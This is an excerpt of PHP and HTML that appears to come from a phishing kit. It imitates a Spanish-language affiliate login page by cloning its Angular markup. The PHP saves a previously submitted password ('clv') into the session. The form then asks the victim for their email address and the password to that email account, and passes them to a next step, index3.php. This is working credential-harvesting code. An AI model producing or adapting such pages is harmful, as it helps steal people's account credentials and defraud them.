...
if (isset($_POST['clv'])){
	$_SESSION['clv'] = $_POST['clv'];
}else  if (isset($_SESSION['clv'])){	
...
<body class="h-100-vh">
	...
	<form  class="ng-pristine ng-invalid ng-touched" method="post" action="index3.php"><!---->
	...
	<label _ngcontent-ejr-c1="" class="etiqueta mb-0" for="inputPassword" style="width: 100%"> Ingresá tu correo electrónico para notificaciones<br>
	...
	<input _ngcontent-ejr-c1="" class="form-control mb-2 ng-pristine ng-invalid ng-touched"  id="inputPassword" name="eml" placeholder="Correo Electrónico Afiliado" 
	type="email" required><div _ngcontent-ejr-c1="" class=" d-inline-block eyePassAligne">
	<span _ngcontent-ejr-c1="" class="manito ion-ojoCerrado"></span></div></div>
	
	<div _ngcontent-ejr-c1="" class="position-relative">
	<input _ngcontent-ejr-c1="" class="form-control mb-2 ng-pristine ng-invalid ng-touched"  id="inputPassword" name="clveml" placeholder="Clave de Correo Electrónico" 
	type="password" required><div _ngcontent-ejr-c1="" class=" d-inline-block eyePassAligne">
	<span _ngcontent-ejr-c1="" class="manito ion-ojoCerrado"></span></div></div>
	
	</div>
	
	<button _ngcontent-ejr-c1="" class="btn btn-lg btn-primary font-Guardian btn-block mt-3" type="submit">Siguiente</button><!---->
